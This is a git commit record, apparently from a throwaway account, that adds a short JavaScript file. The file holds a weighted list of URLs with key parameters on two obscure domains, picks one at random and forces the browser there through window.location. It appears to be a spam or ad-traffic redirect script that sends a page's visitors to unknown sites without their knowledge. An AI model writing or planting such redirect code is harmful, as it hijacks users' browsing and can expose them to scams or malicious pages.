beb88ce437a3316c302a3d9271a9a09dc21ee80b
idhoiphiy <idhoiphiy.o@gmail.com>
2026-05-10 22:37:48 +0700

    Create akeadstgabnggmmg9.js

---
+++ akeadstgabnggmmg9.js
@@ -0,0 +1,16 @@
+var dataUrl = [
+
+'https://arkgleamfox.com/wkr4hi9v?key=57ee67e855faf38e4c7feb082dddb780',
+'https://arkgleamfox.com/wkr4hi9v?key=57ee67e855faf38e4c7feb082dddb780',
+'https://arkgleamfox.com/wkr4hi9v?key=57ee67e855faf38e4c7feb082dddb780',
+'https://arkgleamfox.com/wkr4hi9v?key=57ee67e855faf38e4c7feb082dddb780',
+'https://arkgleamfox.com/wkr4hi9v?key=57ee67e855faf38e4c7feb082dddb780',
+'https://arkgleamfox.com/rnkxadzk?key=e6a1e5bfa3ece8563d1ebb3ce622da38',
+'https://arkgleamfox.com/rnkxadzk?key=e6a1e5bfa3ece8563d1ebb3ce622da38',
+'https://arkgleamfox.com/rnkxadzk?key=e6a1e5bfa3ece8563d1ebb3ce622da38',
+'https://arkgleamfox.com/rnkxadzk?key=e6a1e5bfa3ece8563d1ebb3ce622da38',
+'https://pantomimemailman.com/n38keba9p0?key=5faea91b4ab00ef9e749baf612ab8448'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
